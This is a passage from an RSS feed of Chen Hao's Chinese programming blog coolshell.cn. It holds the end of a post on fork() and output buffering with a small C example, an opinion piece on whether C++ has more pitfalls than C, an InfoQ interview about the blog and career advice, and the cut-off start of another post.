<pre data-enlighter-language="c" class="EnlighterJSRAW"> printf("-");
fflush(stdout);</pre>
<p>就没有问题了（就是6个“-”了），因为程序遇到“\n”，或是EOF，或是缓中区满，或是文件描述符关闭，或是主动flush，或是程序退出，就会把数据刷出缓冲区。需要注意的是，标准输出是行缓冲，所以遇到“\n”的时候会刷出缓冲区，但对于磁盘这个块设备来说，“\n”并不会引起缓冲区刷出的动作，那是全缓冲，你可以使用setvbuf来设置缓冲区大小，或是用fflush刷缓存。</p>
<p>我估计有些朋友可能对于fork()还不是很了解，那么我们把上面的程序改成下面这样：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
int main(void)
{
   int i;
   for(i=0; i&lt;2; i++){
      fork();
      //注意：下面的printf有“\n”
      printf("ppid=%d, pid=%d, i=%d \n", getppid(), getpid(), i);
   }
   sleep(10); //让进程停留十秒，这样我们可以用pstree查看一下进程树
   return 0;
}
</pre>
<p>于是，上面这段程序会输出下面的结果，（注：编译出的可执行的程序名为fork）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">ppid=8858, pid=8518, i=0
ppid=8858, pid=8518, i=1
ppid=8518, pid=8519, i=0
ppid=8518, pid=8519, i=1
ppid=8518, pid=8520, i=1
ppid=8519, pid=8521, i=1

$ pstree -p | grep fork
|-bash(8858)-+-fork(8518)-+-fork(8519)---fork(8521)
|            |            `-fork(8520)</pre>
<p>面对这样的图你可能还是看不懂，没事，我好事做到底，画个图给你看看：</p>
<p><img alt="image placeholder" ></p>
<p>注意：上图中的我用了几个色彩，相同颜色的是同一个进程。于是，我们的pstree的图示就可以成为下面这个样子：（下图中的颜色与上图对应）</p>
<p><img alt="image placeholder" ></p>
<p>这样，对于printf(“-“);这个语句，我们就可以很清楚的知道，哪个子进程复制了父进程标准输出缓中区里的的内容，而导致了多次输出了。（如下图所示，就是我阴影并双边框了那两个子进程）</p>
<p><img alt="image placeholder" ></p>
<p>现在你明白了吧。（另，对于图中的我本人拙劣的配色，请见谅!）</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2012-08-01T08:20:46+08:00</pubDate>
<guid>https://coolshell.cn/articles/7965.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C++的坑真的多吗？ ]]></title>
<link>https://coolshell.cn/articles/7992.html</link>
<content><![CDATA[ 
<p>先说明一下，我不希望本文变成语言争论贴。希望下面的文章能让我们客观理性地了解C++这个语言。（另，我觉得技术争论不要停留在非黑即白的二元价值观上，这样争论无非就是比谁的嗓门大，比哪一方的观点强，毫无价值。我们应该多看看技术是怎么演进的，怎么取舍的。）</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%BA%8B%E7%94%B1" title="事由">事由</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#C%E7%9C%9F%E7%9A%84%E6%AF%94C%E5%B7%AE%E5%90%97%EF%BC%9F" title="C++真的比C差吗？">C++真的比C差吗？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#C%E7%9A%84%E5%9D%91%E6%9C%89%E5%A4%9A%E5%B0%91%EF%BC%9F" title="C++的坑有多少？">C++的坑有多少？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#C%E7%9A%84%E5%88%9D%E8%A1%B7" title="C++的初衷">C++的初衷</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%88%91%E5%AF%B9C%E7%9A%84%E6%84%9F%E6%83%85" title="我对C++的感情">我对C++的感情</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#C%E7%9A%84%E6%9C%AA%E6%9D%A5" title="C++的未来">C++的未来</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%BA%8B%E7%94%B1"></span>事由<span class="ez-toc-section-end"></span>
</h4>
<p><img alt="image placeholder" >周五的时候，我在我的微博上发了一个贴说了一下一个网友给我发来的C++程序的规范和内存管理写的不是很好（后来我删除了，因为当事人要求），我并非批判，只是想说明其实程序员是需要一些“疫苗”的，并以此想开一个“程序员疫苗的网站”，结果，@简悦云风同学<a href="https://weibo.com/2388714105/yvqWKkcGV">直接回复到</a>：“<strong>不要用 C++ 直接用 C , 就没那么多坑了。</strong>”就把这个事带入了语言之争。</p>
<p>我又<a href="https://weibo.com/1401880315/yvrMMsCuT" target="_blank">发了一条微博</a>：</p>
<p style="padding-left: 30px;"><a title="左耳朵耗子" href="https://weibo.com/1401880315/profile">@左耳朵耗子</a> <a href="http://verified.weibo.com/verify" target="_blank"><img alt="image placeholder" ></a>： <span style="color: #800080;">说C++比C的坑更多的人我可以理解，但理性地思考一下。C语言的坑也不少啊，如果说C语言有90个坑，那么C++就是100个坑（另，<strong>我看很多人都把C语言上的坑也归到了C++上来</strong>），但是C++你得到的东西更多，封装，多态，继承扩展，泛型编程，智能指针，……，你得到了500%东西，但却只多了10%的坑，多值啊</span>。</p>
<p>结果引来了更多的回复（只节选了一些言论）：</p>
<ul>
<li>@淘宝褚霸<a href="https://weibo.com/1915508822/yvshunX41">也在微博里说</a>：“<span style="color: #800080;">自从5年前果断扔掉C++，改用了ansi c后，我的生活质量大大提升，没有各种坑坑我。</span>”</li>
</ul>
<ul>
<li>@Laruence<a href="https://weibo.com/1170999921/yvsgisAgB" target="_blank">在其微博里</a>说: “<span style="color: #800080;">我确实用不到, C语言灵活运用struct, 可以很好的满足这些需求.//@左耳朵耗子: 封装，继承，多态，模板，智能指针，这也用不到？这也学院派？//@Laruence: 问题是, 这些东西我都用不到… C语言是工程师搞的, C++是学院派搞的</span>”</li>
</ul>
<p><strong>那么，C++的坑真的多么？我还请大家理性地思考一下</strong>。</p>
<p><span id="more-7992"></span></p>
<div>
<h4>
<span class="ez-toc-section" id="C%E7%9C%9F%E7%9A%84%E6%AF%94C%E5%B7%AE%E5%90%97%EF%BC%9F"></span>C++真的比C差吗？<span class="ez-toc-section-end"></span>
</h4>
<p>我们先来看一个图——《<a href="https://coolshell.cn/articles/1850.html" target="_blank">各种程序员的嘴脏的对比</a>》，从这个图上看，C程序员比C++的程序员在注释中使用fuck的字眼多一倍。这说明了什么？<strong>我个人觉得这说明C程序员没有C++程序员淡定</strong>。</p>
</div>
<p><img alt="image placeholder" ></p>
<p>不要太纠结上图，只是轻松一下，我没那么无聊，让我们来看点真正的论据。</p>
<p>相信用过C++的程序员知道，C++的很多特性主要就是解决C语言中的各种不完美和缺陷：（注：<strong>C89、C99中许多的改进正是从C++中所引进的</strong>）</p>
<ul>
<li>用namespace解决了很C函数重名的问题。</li>
</ul>
<ul>
<li>用const/inline/template代替了宏，解决了C语言中宏的各种坑。</li>
</ul>
<ul>
<li>用const的类型解决了很多C语言中变量值莫名改变的问题。</li>
</ul>
<ul>
<li>用引用代替指针，解决了C语言中指针的各种坑。这个在Java里得到彻底地体现。</li>
</ul>
<ul>
<li>用强类型检查和四种转型，解决了C语言中乱转型的各种坑。</li>
</ul>
<ul>
<li>用封装（构造，析构，拷贝构造，赋值重载）解决了C语言中各种复制一个结构体（struct）或是一个数据结构（link, hashtable, list, array等）中浅拷贝的内存问题的各种坑。</li>
</ul>
<ul>
<li>用封装让你可以在成员变量加入getter/setter，而不会像C一样只有文件级的封装。</li>
</ul>
<ul>
<li>用函数重载、函数默认参数，解决了C中扩展一个函数搞出来像func2()之类的ugly的东西。</li>
</ul>
<ul>
<li>用继承多态和RTTI解决了C中乱转struct指针和使用函数指针的诸多让代码ugly的问题。</li>
</ul>
<ul>
<li>用RAII，智能指针的方式，解决了C语言中因为出现需要释放资源的那些非常ugly的代码的问题。</li>
</ul>
<ul>
<li>用OO和GP解决各种C语言中用函数指针，对指针乱转型，及一大砣if-else搞出来的ugly的泛型。</li>
</ul>
<ul>
<li>用STL解决了C语言中算法和数据结构的N多种坑。</li>
</ul>
<div>（注意：上面我没有提重载运算符和异常，前者写出来的代码并不易读和易维护（参看《<a title="恐怖的C++语言" href="https://coolshell.cn/articles/1724.html" target="_blank">恐怖的C++语言</a>》后面的那个示例），坑也多，后者并不成熟（相对于Java的异常），但是我们需要知道try-catch这种方式比传统的不断地判断函数返回值和errno形成的大量的if-else在代码可读性上要好很多）</div>
<p>上述的这些东西填了不知有多少的C语言编程和维护的坑。<strong>少用指针，多用引用，试试autoptr，用用封装，继承，多态和函数重载…… 你面对的坑只会比C少，不会多。</strong></p>
<h4>
<span class="ez-toc-section" id="C%E7%9A%84%E5%9D%91%E6%9C%89%E5%A4%9A%E5%B0%91%EF%BC%9F"></span>C++的坑有多少？<span class="ez-toc-section-end"></span>
</h4>
<p>C++的坑真的不多，如果你能花两到三周的时候读一下《<a href="https://book.douban.com/subject/1231590/" target="_blank">Effecitve C++</a>》里的那50多个条款，你就知道C++里的坑并不多，而且，有很多条款告诉我们C++是怎么解决C的坑的。然后，你可以读读《<a href="https://book.douban.com/subject/1967356/" target="_blank">Exceptional C++</a>》和《<a href="https://book.douban.com/subject/1244943/" target="_blank">More Exceptional C++</a>》，你可以了解一下C++各种问题的解决方法和一些常见的经典错误。</p>
<p>当然，C++在解决了很多C语的坑的同时，也因为OO和泛型又引入了一些坑。消一些，加一些，我个人感觉上总体上只比C多10%左右吧。但是你有了开发速度更快，代码更易读，更易维护的500%的利益。</p>
<p>另外，不可否认的是，C++中的代码出了错误，有时候很难搞，而且似乎用C++的人会觉得C++更容易出错？我觉得主要是下面几个原因：</p>
<ul>
<li><strong>C和C++都没学好，大多数人用C++写C，所以，C的坑和C++的坑合并了。</strong></li>
</ul>
<ul>
<li><strong><strong>C++太灵活了，想怎么搞就怎么搞，所以，各种不经意地滥用和乱搞。</strong></strong></li>
</ul>
<p>另外，C++的编译对标准C++的实现各异，支持地也千差万别，所以会有一些比较奇怪的问题，但是如果你一般用用C++的封装，继承，多态，以及namespace，const, refernece,  inline, templete, overloap, autoptr，还有一些OO 模式，并不会出现奇怪的问题。</p>
<p>而对于STL中的各种坑，我觉得是程序员们还对GP（泛型编程）理解得还不够，STL是泛型编程的顶级实践！属于是大师级的作品，一般人很难理解。必需承认STL写出来的代码和编译错误的确相当复杂晦涩，太难懂了。这也是C++的一个诟病。</p>
<p>这和<a href="https://coolshell.cn/articles/1724.html" target="_blank">Linus说的一样</a> —— “<strong>C++是一门很恐怖的语言，而比它更恐怖的是<span style="color: #cc0000;">很多不合格的程序员</span>在使用着它</strong>”。注意我飘红了“<span style="color: #cc0000;"><strong>很多不合格的程序员</strong></span>”！</p>
<p>我觉得C++并不适合初级程序员使用，C++只适合高级程序员使用（参看《<a title="“21天教你学会C++”" href="https://coolshell.cn/articles/2250.html" target="_blank">21天学好C++</a>》和《<a title="C++ 程序员自信心曲线图" href="https://coolshell.cn/articles/2287.html" target="_blank">C++学习自信心曲线</a>》），正如《<a title="Why C++ ? 王者归来" href="https://coolshell.cn/articles/6548.html" target="_blank">Why C++</a>》中说的，C++适合那些对开发维护效率和系统性能同时关注的高级程序员使用。</p>
<p><strong>这就好像飞机一样，开飞机很难，开飞机要注意的东西太多太多，对驾驶员的要求很高，但你不能说飞机这个工具很烂，开飞机的坑太多。</strong>（注：我这里并不是说C++是飞机，C是汽车，C++和C的差距，比飞机到汽车的差距少太多太多，这里主要是类比，我们对待C++语言的心态！）</p>
<h4>
<span class="ez-toc-section" id="C%E7%9A%84%E5%88%9D%E8%A1%B7"></span>C++的初衷<span class="ez-toc-section-end"></span>
</h4>
<p>理解C++设计的最佳读本是《<a href="https://book.douban.com/subject/1096216/" target="_blank">C++演化和设计</a>》，在这本书中Stroustrup说了些事：</p>
<p style="padding-left: 30px;">1）Stroustrup对C是非常欣赏，<strong>实际上早期C++许多的工作是对于C的强化和净化</strong>，并把完全兼容C作为强制性要求。C89、C99中许多的改进正是从C++中所引进。可见，Stroustrup对C语言的贡献非常之大。<strong>今天不管你对C++怎么看，C++的确扩展和进化了C，对C造成了深远的影响</strong>。</p>
<p style="padding-left: 30px;">2）Stroustrup对于C的抱怨主要来源于两个方面——在C++兼容C的过程中遇到了不少设计实现上的麻烦；以及守旧的K&amp;R C程序员对Stroustrup的批评。<strong>很多人说C++的恶梦就是要去兼容于C，这并不无道理（</strong>Java就干的比C++彻底得多<strong>）</strong>，但这并不是Stroustrup考虑的，Stroustrup一边在使尽浑身解数来兼容C，另一方面在拼命地优化C。</p>
<p style="padding-left: 30px;">3）Stroustrup在书中直接说，C++最大的竞争对手正是C，他的目的就是——<strong>C能做到的，C++也必须做到，而且要做的更好</strong>。大家觉得是不是做到了？有多少做到了，有多少还没有做到？</p>
<p style="padding-left: 30px;">4）对于同时关注的运行效率和开发效率的程序员，Stroustrup多次强调C++的目标是——“<strong>在保证效率与C语言相当的情况下，加强程序的组织性；能保证同样功能的程序，C++更短小</strong>”，<strong>这正是<span style="color: #ff0000;">浅封装</span>的核心思想</strong>。而不是过渡设计的OO。（参看：<a title="面向对象是个骗局？！" href="https://coolshell.cn/articles/3036.html" target="_blank">面向对象是个骗局</a>）</p>
<p style="padding-left: 30px;">5）这本书中举了很多例子来回应那些批评C++有运行性能问题的人。C++在其第二个版本中，引入了虚函数机制，这是C++效率最大的瓶颈了，但我个人认为虚函数就是多了一次加法运算，但让我们的代码能有更好的组织，极大增加了程序的阅读和降底了维护成本。（注：Lippman的《<a href="https://book.douban.com/subject/1091086/" target="_blank">深入探索C++对象模型</a>》也说明了C++不比C的程序在运行性能低。Bruce的《<a href="https://book.douban.com/subject/1057170/" target="_blank">Think in C++</a>》也说C++和C的性能相差只有5%）</p>
<p style="padding-left: 30px;">6）这本书中还讲了一些C++的痛苦的取舍，印象最深的就是多重继承，提出，拿掉，再被提出，反复很多次，大家在得与失中不断地辩论和取舍。这个过程让我最大的收获是——a) <strong>对于任何一种设计都有好有坏，都只能偏重一方</strong>，b) <strong>完全否定式的批评是不好的心态，好的心态应该是建设性地批评</strong>。</p>
<h4>
<span class="ez-toc-section" id="%E6%88%91%E5%AF%B9C%E7%9A%84%E6%84%9F%E6%83%85"></span>我对C++的感情<span class="ez-toc-section-end"></span>
</h4>
<p>我先说说我学C++的经历。</p>
<p>我毕业时，是直接从C跳过C++学Java的，但是<strong>学Java的时候，不知道为什么Java要设计成这样，只好回头看C++，结果学C++的时候又有很多不懂，又只得回头看C</strong>，<strong>最后发现，C -&gt; C++ -&gt; Java的过程，就是C++填C的坑，Java填C++的坑的过程</strong>。</p>
<p>注，下面这些东西可以看到Java在填C/C++坑：</p>
<ul>
<li>Java彻底废弃了指针（指针这个东西，绝对让这个社会有几百亿的损失），使用引用。</li>
<li>Java用GC解决了C++的各种内存问题的诟病，当然也带来了GC的问题，不过功大于过。</li>
<li>Java对异常的支持比C++更严格，让编程更方便了。</li>
<li>Java没有像C++那样的template/macro/函数对象/操作符重载，泛型太晦涩，用OO更容易一些。</li>
<li>Java改进了C++的构造、析构、拷贝构造、赋值。</li>
<li>Java对完全抛弃了C/C++这种面向过程的编程方式，并废弃了多重继承，更OO（如：用接口来代替多重继承）</li>
<li>Java比较彻底地解决了C/C++自称多年的跨平台技术。</li>
<li>Java的反射机制把这个语言提升了一个高度，在这个上面可以构建各种高级用法。</li>
<li>C/C++没有一些比较好的类库，比如UI，线程 ，I/O，字符串处理等。（C++0x补充了一些）</li>
<li>等等……</li>
</ul>
<p>当然时代还在前进，这个演变的过程还在C#和Go上体现着。不过我学习了C -&gt; C++  -&gt; Java这个填坑演进的过程，让我明白了很多东西：</p>
<ul>
<li>我明白了OO是怎么一回事，重要的是明白了OO的封装，继承，和多态是怎么实现的。（参看我以前写过的《<a title="C++ 虚函数表解析" href="https://coolshell.cn/articles/12165.html" target="_blank">C++虚函数表解析</a>》和《<a title="C++ 对象的内存布局" href="https://coolshell.cn/articles/12176.html" target="_blank">C++对象内存布局</a>》）</li>
<li>我明白了STL的泛型编程和Java的各种花哨的技术是怎么一回事，以及那些很花哨的编程方法和技术。</li>
<li>我明白了C，C++，Java的各中坑，这就好像玩火一样，我知道怎么玩火不会烧身了。</li>
</ul>
<p><span style="color: #cc0000;"><strong>我从这个学习过程中得到的最大的收获不是语言本身，而是各式各样的编程技术和方法，和技术的演进的过程，这比语言本身更重要</strong>！</span>（<strong>在这个角度上学习，你看到的不是一个又一个的坑，你看到的是——各式各样让你可以爬得更高的梯子</strong>）</p>
<p>我对C++的感情有三个过程：先是喜欢地要死，然后是恨地要死，现在的又爱又恨，爱的是这个语言，恨的是很多不合格的人在滥用和凌辱它。</p>
<h4>
<span class="ez-toc-section" id="C%E7%9A%84%E6%9C%AA%E6%9D%A5"></span>C++的未来<span class="ez-toc-section-end"></span>
</h4>
<p>C++语言发展大概可以分为三个阶段（<a href="https://zh.wikipedia.org/wiki/C%2B%2B" target="_blank">摘自Wikipedia</a>）：</p>
<ul>
<li>第一阶段从80年代到1995年。这一阶段C++语言基本上是传统类型上的面向对象语言，并且凭借著接近C语言的效率，在工业界使用的开发语言中占据了相当大份额；</li>
<li>第二阶段从1995年到2000年，这一阶段由于标准模板库（STL）和后来的Boost等程式库的出现，泛型程式设计在C++中占据了越来越多的比重性。当然，同时由于Java、C#等语言的出现和硬件价格的大规模下降，C++受到了一定的冲击；</li>
<li>第三阶段从2000年至今，由于以Loki、MPL等程式库为代表的产生式编程和模板元编程的出现，C++出现了发展历史上又一个新的高峰，这些新技术的出现以及和原有技术的融合，使C++已经成为当今主流程式设计语言中最复杂的一员。</li>
</ul>
<p>在《<a title="Why C++ ? 王者归来" href="https://coolshell.cn/articles/6548.html" target="_blank">Why C++? 王者归来</a>》中说了 ，性能主要就是要省电，省电就是省钱，在数据中心还不明显，在手机上就更明显了，这就是为什么Android 支持C++的原因。所以，在NB的电池或是能源出现之前，<strong>如果你需要注重程序的运行性能和开发效率，并更关注程序的运性能，那么，应该首选 C++</strong>。这就是iOS开发也支持C++的原因。</p>
<p><img alt="image placeholder" ></p>
<p>今天的C++11中不但有更多更不错的东西，而且，还填了更多原来C++的坑。（参看：<a href="https://zh.wikipedia.org/wiki/C%2B%2B11" target="_blank">C++11 Wiki</a>，<a title="C++11 中值得关注的几大变化（详解）" href="https://coolshell.cn/articles/5265.html" target="_blank">C++ 11的主要特性</a>）</p>
<p style="text-align: center;"> <img alt="image placeholder" ></p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span><strong>总结</strong><span class="ez-toc-section-end"></span>
</h4>
<ul>
<li><strong>C++并不完美，但学C++必然让你受益无穷。</strong></li>
</ul>
<ul>
<li><strong>是那些不合格的、想对编程速成的程序员让C++变得坑多。</strong></li>
</ul>
<p>最后，非常感谢能和“<strong>@简悦云风</strong>”，“<strong>@淘宝诸霸</strong>”，“<strong>@Laruence</strong>”一起讨论这个问题！无论你们的观点怎么样，我都和你们“在一起”，嘿嘿嘿……</p>
<p>(全文完)</p>
 ]]></content>
<pubDate>2012-08-06T08:12:05+08:00</pubDate>
<guid>https://coolshell.cn/articles/7992.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ InfoQ的ArchSummit大会对我的采访 ]]></title>
<link>https://coolshell.cn/articles/8031.html</link>
<content><![CDATA[ 
<p>偷个懒，做个更新，今天下午InfoQ的ArchSummit对我的一些采访。我整理了一下，算做是我个人写酷壳的一些想法和总结。不过问我的这些问题并不尖锐，呵呵，不像<a href="https://weibo.com/stonemama" target="_blank">@图灵谢工</a> 问我的问题：“你的价值观太过理想，根本不现实，你站在道德的高点拷问社会，是不是想炒作自己？”。</p>
<p><strong>1) 作为酷壳的博主，请您大概介绍下酷壳是什么时候开始的，初衷是什么 ？</strong></p>
<p>我写blog是从2002年开始（那时还没有blog这个词），当时对我来说，没有自己的电脑，上网很不方便，而我有写学习笔记的习惯，读书和工作中学到的一些东西需要保存在某个地方，我希望这个地方可以让我在任何地方都可以调出来看看（因为我当时的工作出差太多），正好当时的CSDN有个“专家专栏”的功能，也就是后来出现的blog。</p>
<p>后来Blog出现后，CSDN把自己的“专家专栏”全部迁移到了blog.csdn.net上，07-08年这段时间，CSDN的blog基本上是不能使用，性能差得不能再差，每天宕机，上传图片，贴代码，都非常不好用。也许，这就是使用.NET/Windows平台的问题（开个玩笑）。</p>
<p>我是从2009年3月开始创建酷壳的，创建的初衷如下：</p>
<ul>
<li>我需要一个更稳定，更方便的地方，我的博客的风格不会被大众的风格所掩盖的地方。</li>
<li>我的从事新闻的老婆很不待见<a href="http://blog.csdn.net/haoel" target="_blank">我在CSDN的博客</a>，她觉得太技术，书呆子。</li>
<li>我正好看到了煎蛋这个国外娱乐新闻文摘的blog，而我正好每天会有2个小时阅读国外社区的东西。</li>
</ul>
<p>基于上述三个原因，我自己花了4500元/年租了个主机，建了酷壳。所以，这也是你一开始看到酷壳基本上是娱乐性比较强的博客，我收集一些比较有意思的程序员中发生的事情，也收集一各式各样的程序员圈子里的各处观点。</p>
<p>我当时的想法是，一些特别技术的东西，我会和CSDN同步，而一些轻松的话题，我会放在酷壳。我当时的初衷就是想说明程序员并不是一个木纳、书呆子、不食人间烟火、巨无趣的一个群体，程序员圈子里同样也有很多有趣的东西。所以，你可以看到11年初以前的东西我有很多网络恶搞式乱调侃的语言。</p>
<p><span id="more-8031"></span></p>
<p>但到了2011年初让我开始让我有些转变，主要是读者越来越多，而且，有一些人已经把酷壳当成了一个提升自己能力和、开阔眼界、甚至需要指导的地方，我的压力就这样来了，这种压力让我开始不能太娱乐，因为有一些人是很认真地在看酷壳的文章，在期待能从酷壳获得有价值的东西……</p>
<p><strong>2）技术人员的个人博客不胜其数，但真正可以吸引人眼球的并不多，能谈谈成功运营一个个人博客的精髓是什么？</strong></p>
<p>哪有什么运营，完全是顺其自然，误打误撞。</p>
<p>是的，技术人员的博客太多了，酷壳并不是技术最好的，也不是资讯最好的。淘宝的很多技术团队的博客都很不错，还有阮一峰的博客，还有各种各样的如CSDN，博客园，51CTO，ZDNET这样的社区。所以，我需要做点不一样的，而且我觉得还有一些这些社区和博客都还没有涉及的地方。</p>
<p>对于社区最大的问题就是，他们就像我们学校里的学生一样，喜欢大量地收获聚集文章和知识，填鸭式的网站，网站的编辑不懂技术。对于一些技术博客的问题并不是他们不懂技术，而是太过技术，只有技术，少了一些程序员的文化，观点和视野。</p>
<p>程序员是一个圈子，一个小社会，这个圈子里并不只有技术和知识，还有很多很多的东西，例如：程序员们都说自己比较辛苦，都说自己没有得到足够的尊重，还有一些如敏捷，流程，产品等地方程序员的观点没有得到表达，还有一些程序员这个社区内比较特有的东西，比如：编程语言之争，这本是一个很好的话题，是程序员圈子里的文化，但是每次讨论都是骂来骂去的，需要有人去引导程序员，带领他们用正确的价值观去看待和思考这些东西。</p>
<p>这就是酷壳和其它博客和社区不一样的地方，我关注的并不只有技术，还有程序员的文化和想法，并且输出一些或偏执或鲜明或个人或激进的价值观，无论怎么样，你认同也好，不认同也可以，你可以看到酷壳和我还有酷壳里的讨论都是真实的。</p>
<p><strong>3）根据你博客的自我介绍，想从纯底层技术方向转型为业务技术方向，让你产生这种想法的最大原因是什么？</strong></p>
<p>纯底层做得太多了，有些书呆子了，与人打交道有问题了，而且觉得地底有点不识人间烟火了，我想知道用户是怎么用我们的产品的，我想知道用户是怎么想的，整天在那调网络性能，调系统性能，搞多线程，搞内存漏洞，整天在矿道里打洞， 想出来见见天日。呵呵。</p>
<p>但这并不代码我觉得业务和用户要比技术有用得多，也并不是说技术无用论。</p>
<p>我觉得这就好像一颗大树，这些底层的技术，可以让你站得非常非常稳，可以让你抵御洪灾和暴风，但是如果你想伸长得更高更广，你还是需要地面上的枝叶。我觉得我的底层知识够深入了，我需要了解业务知识和用户，因为我不但想站得稳，扎得深，我也想伸得高。</p>
<p><strong>4）酷壳产出文章是怎么样的频率？每篇博文 ，你大概需要多少时间？</strong></p>
<p>我每天都有阅读的习惯，尤其是阅读网文，每天两个小时，而且我是一个爱思考的人，思考的对不对不一定，但是我很喜欢去思考。现在又上了微博和一些朋友互动，也会引发我的一些思考，所以，文章就是在阅读、交流和思考中产生的。</p>
<p>2011年初以前，平均每周3篇，有时候一周有10篇，现在基本上每周一篇。以前的文章花不了太多时间 ，因为比较娱乐，现在的文章很花时间，比如《程序员练级攻略》花了我四周的时间 ，《性能调优攻略》花了我三周多的时间，基本上来说，现在的文章至少也要花我1-2天的时间。我想把文章的数量降下来，这样，我可以思考得更好更透彻一些，这样文章里的营养更多一些。</p>
<p><strong>5）是不是可以给年轻的朋友，或是风刚从事软件开发工作的朋友，一些职业发展的建议？</strong></p>
<p>主要是下面几点：</p>
<ul>
<li>不要追新技术，应该多看看那些经历了很长时间的常青的技术。</li>
</ul>
<ul>
<li>多研究一下历史，和技术的演进，这样你才能知道技术的未来。今天的很多东西都在过去有身影，如：今天的移动端和云端架构和以前的Unix和终端的关系，还有管道，和Unix设计的哲学也在今天Service Interface式的设计中有得到传承，等等。</li>
</ul>
<ul>
<li>我可以急功近利以解决问题和追赶技术潮流，但是，如果你需要成为一个领域的专家，你需要非常非常注重基础。速成编程的方式只能让你成为劳动力，而不能成为工匠或技术和知识的驾驭者。</li>
</ul>
<ul>
<li>不要被产商的文化所主导了，多看看社区的文化，尤其是Unix/C的文化，这是计算机文化的根（参看我写过的《<a title="Unix传奇(上篇)" href="https://coolshell.cn/articles/2322.html" target="_blank">Unix传奇</a>》）</li>
</ul>
<ul>
<li>注重基础，广度是深度是副产品。</li>
</ul>
<p><strong>6）以你过往的经历，你是如何看待“架构师”这个角色的？他的义务是如何分配的？</strong></p>
<p>架构就是Design一个部分，就是软件设计的一块，软件设计最重要的有两点：</p>
<ul>
<li>业务功能性需求分析和非功能性需求分析，</li>
<li>技术基础的深刻认识，需要有非常丰富的经验。</li>
</ul>
<p>试问一下，程序员做软件不需要设计吗？做设计不需要设计架构吗？很自然的，今天的工程师，程序员已经在做架构设计上的事了。所以，我觉得架构设计这个工作本就是程序员（或者说是高级程序员）工作的一部分。</p>
<p>但是，我个人认为架构师在某些情况下也还是需要的，但其应该是对业务和技术都很熟悉的人，并且偏技术，也要写代码的人。在一些公司，上下一盘棋，的确需要对总体架构设计，并保证这个框架能够被各个工程团队贯彻实现的那么一个团队，但他们应该更多地深入到一线工程团队的。</p>
<p>所以，我觉得架构师就是一个高级程序员，而不是一个拍脑袋，关说不练的人。</p>
<p>这点，看看Linux的架构师团队就知道了，一样的需要写代码，fix-bug，一样地需要了解各个公司对linux提出的各种各样的需求。</p>
<p><strong>7）现阶段酷壳的文章，都是你一个人写的吗？是否有其他同仁加入写作？</strong></p>
<p>并不都是我一个人写的，我希望酷壳是大家一起来写的，事实上也有一些人写，只是不多。只是我个人的色彩过重了一些，我的个性压制了众性。</p>
<p>（不过，我真的无法自证都是我写的，我有没有团队，呵呵，管它有没有团队，是不是人代写，重要的是那些文章的内容是否对大家有帮助，或是对社区有贡献。；））</p>
<p><strong>8）你对酷壳未来的构想是什么？还是一个技术交流的平台吗？</strong></p>
<p>对于酷壳来说，其文化和价值观比较重一些，短期内，还是以我个人色彩为主一些，虽然我希望这是一个大家都能来分享的地方。前段时间我有个想法想做一个“程序员疫苗站”，就像我们一出生时接种的各种疫苗可以让我们抵抗各种病毒一样，这个网站可以让程序员接种一些犯低级错误的疫苗，从而对这些低级错误有抵抗。我还没有想得特别清楚，不过方向基本上是这个方面的。</p>
<p>（全文完）</p>
<p></p>
 ]]></content>
<pubDate>2012-08-12T16:02:28+08:00</pubDate>
<guid>https://coolshell.cn/articles/8031.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 对技术的态度 ]]></title>
<link>https://coolshell.cn/articles/8088.html</link>
<content><![CDATA[ 
<p>最近人品爆发，图灵社区，InfoQ，51CTO相继对我做了采访，前两天我把<a title="InfoQ的ArchSummit大会对我的采访" href="https://coolshell.cn/articles/8031.html" target="_blank">InfoQ对我的采访张贴了出来</a>，今天，图灵社区和51CTO对我的采访发布了（<a title="图灵访谈之三十二：我的精神家园——陈皓（@左耳朵耗子）专访" href="http://www.ituring.com.cn/article/9174" target="_blank">图灵的访谈</a> ，<a title="专访陈皓：有关带队、沟通、成长与变化" href="http://developer.51cto.com/art/201208/353256.htm" target="_blank">51CTO的访谈</a>），我是一个有技术焦虑症的人，我的经历比较特殊，对大家来说可能也没有什么意思，这两个采都有一些重叠的部分，不过有些观点我想再加强一些，并放在这里和大家一起分享一下。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
